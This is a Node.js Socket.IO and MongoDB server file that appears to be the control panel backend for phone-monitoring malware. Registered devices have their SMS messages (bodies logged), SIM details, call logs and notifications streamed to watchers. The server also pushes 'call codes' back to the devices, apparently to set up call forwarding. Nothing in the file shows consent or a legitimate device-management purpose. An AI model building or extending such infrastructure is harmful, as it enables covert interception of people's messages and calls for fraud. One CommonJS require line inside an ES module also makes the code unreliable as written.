// server.js
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
const authRoutes = require("./routes/authRoutes");
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

// EXPRESS + SOCKET SETUP
const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// CLEAN UNIQUEID
function cleanId(id) {
  if (!id) return null;
  return id.toString().trim().toUpperCase();
}

// MAPS
const deviceSockets = new Map(); // device → socketID
const watchers = new Map(); // UI watchers → socket list

// BROADCAST FOR UI
function notifyWatchers(uniqueid, payload) {
  const set = watchers.get(uniqueid);
  if (!set) return;

  for (let sid of set) {
    io.to(sid).emit("deviceRealtime", payload);
  }
}

// SOCKET IO ===============================
io.on("connection", (socket) => {
  console.log("🟢 CONNECTED:", socket.id);
  let currentUniqueId = null;

  // UI START WATCHING DEVICE
  socket.on("watchDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;

    if (!watchers.has(id)) watchers.set(id, new Set());
    watchers.get(id).add(socket.id);

    console.log("👁 UI Watching:", id);
  });

  // STOP WATCHING
  socket.on("unwatchDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;

    if (watchers.has(id)) watchers.get(id).delete(socket.id);
  });

  // PHONE REGISTERS
  socket.on("registerDevice", (rawId) => {
    const id = cleanId(rawId);
    if (!id) return;

    console.log("🔗 Device Registered:", id);

    deviceSockets.set(id, socket.id);
    currentUniqueId = id;

    socket.join(id);
    saveLastSeen(id, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid: id });

    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid: id,
    });

    notifyWatchers(id, {
      uniqueid: id,
      connectivity: "Online",
      updatedAt: new Date(),
    });
  });

  // DEVICE STATUS UPDATE
  socket.on("deviceStatus", (data = {}) => {
    let id = cleanId(data.uniqueid);
    if (!id) return;

    const connectivity = data.connectivity || "Online";

    console.log(`⚡ ${id} → ${connectivity}`);
    saveLastSeen(id, connectivity);

    const payload = {
      uniqueid: id,
      connectivity,
      updatedAt: new Date(),
    };

    io.emit("deviceStatus", payload);
    notifyWatchers(id, payload);
  });

  // DISCONNECT
  socket.on("disconnect", () => {
    console.log("🔴 SOCKET DISCONNECTED:", socket.id);

    if (currentUniqueId) {
      const id = currentUniqueId;
      const latestSocket = deviceSockets.get(id);

      if (latestSocket === socket.id) {
        console.log("🛑 DEVICE OFFLINE:", id);

        deviceSockets.delete(id);
        saveLastSeen(id, "Offline");

        const payload = {
          uniqueid: id,
          connectivity: "Offline",
          updatedAt: new Date(),
        };

        io.emit("deviceStatus", payload);

        io.emit("deviceListUpdated", {
          event: "device_disconnected",
          uniqueid: id,
        });

        notifyWatchers(id, payload);
      }
    }

    // REMOVE FROM WATCHERS
    for (let [id, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

// SAVE LAST SEEN ===============================
async function saveLastSeen(uniqueid, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;

    await fetch(`http://localhost:${PORT}/api/lastseen/${uniqueid}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.log("❌ LastSeen Error:", err.message);
  }
}

// SEND CALL CODE TO DEVICE ======================
export function sendCallCodeToDevice(rawId, data) {
  const id = cleanId(rawId);
  if (!id) return;

  console.log("📞 CALL EMIT:", id);

  io.to(id).emit("callCodeUpdate", data);
  notifyWatchers(id, { type: "call", ...data });
}

// ADMIN GLOBAL BROADCAST =========================
export function sendAdminGlobal(data) {
  console.log("👑 ADMIN UPDATE:", data);
  io.emit("adminUpdate", data);
}

// MONGO WATCH STREAMS ============================
mongoose.connection.once("open", () => {
  console.log("📡 Mongo Streams ACTIVE");

  function watch(collection, cb) {
    const start = () => {
      try {
        const stream = mongoose.connection.collection(collection).watch();

        stream.on("change", async (chg) => {
          if (!["insert", "update", "replace"].includes(chg.operationType)) return;

          const doc = await mongoose.connection
            .collection(collection)
            .findOne({ _id: chg.documentKey._id });

          if (doc) cb(doc);
        });

        stream.on("error", (err) => {
          console.log("🔥 Stream Error:", err.message);
          console.log("🔄 Restarting stream for:", collection);
          setTimeout(start, 2000);
        });
      } catch (e) {
        console.log("🔥 Watch Init Error:", e.message);
        setTimeout(start, 2000);
      }
    };

    start();
  }

  // CALL STREAM
  watch("callcodes", (doc) => {
    if (doc.uniqueid) {
      console.log("📡 CALLCODE CHANGED:", doc.uniqueid);
      sendCallCodeToDevice(doc.uniqueid, doc);
    }
  });

  // SMS STREAM (REALTIME)
  watch("sms", (doc) => {
    if (!doc.uniqueid) return;

    const id = cleanId(doc.uniqueid);
    console.log("📩 SMS CHANGE:", id, "→", doc.body);

    io.to(id).emit("smsUpdate", doc);
    notifyWatchers(id, { type: "sms", ...doc });
  });

  watch("admins", (doc) => sendAdminGlobal(doc));

  watch("siminfos", (doc) => io.emit("simInfoUpdated", doc));

  watch("devices", (doc) => {
    io.emit("deviceListUpdated", { event: "db_update", device: doc });
  });
});

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/auth", authRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);


app.get("/", (req, res) => res.send(" Real-time Backend Running"));

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(` Server Running on PORT ${PORT}`));
